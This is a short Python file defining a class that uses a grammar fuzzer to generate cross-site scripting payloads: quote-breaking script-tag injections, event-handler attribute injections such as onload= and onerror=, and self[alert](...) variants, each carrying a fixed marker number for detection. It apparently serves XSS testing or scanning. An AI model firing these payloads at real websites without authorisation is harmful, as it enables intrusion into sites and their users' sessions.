from a import simple_grammar_fuzzer

class xssPayload:

    detect = "111111111111111"
    def __init__(self):
        pass
    
    def generator(self, GRAMMAR):
        return set([simple_grammar_fuzzer(GRAMMAR) for i in range(50)])


    # payload formmat: "><script>alert(1)</script>
    def generator_xss_1(self):
        XSS_PAYLOAD1 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@quote@@specialCharacter@<script>@command@</script>"],
            "@quote@" : ["\"", "'"],
            "@specialCharacter@" : [">"],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD1 )

    #payload include global variable like: self, ...
    def generator_xss_3(self):
        XSS_PAYLOAD3 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@global@[@command@](@value@)"],
            "@global@" : ["self"],
            "@command@" : ["alert", "prompt"],
            "@value@" : ["111111111111111"]
        
        }
        return self.generator(XSS_PAYLOAD3)

    #payload format: " onload="javascript:alert(1)"
    def generator_xss_2(self):
        XSS_PAYLOAD2 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@quote@@space@@event@@command@@quote@"],
            "@quote@" : ["\"", "'"],
            "@space@" : ["", " "],
            "@event@" : ["onunload=", "onscroll=", "onfocus=", "onclick=", "onmouseover=", "onmouseout=", "onload=", "onerror=" , "onresize=", "onrropertychange=", "onpagehide="],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD2 )

    
a = xssPayload()
print(a.generator_xss_3())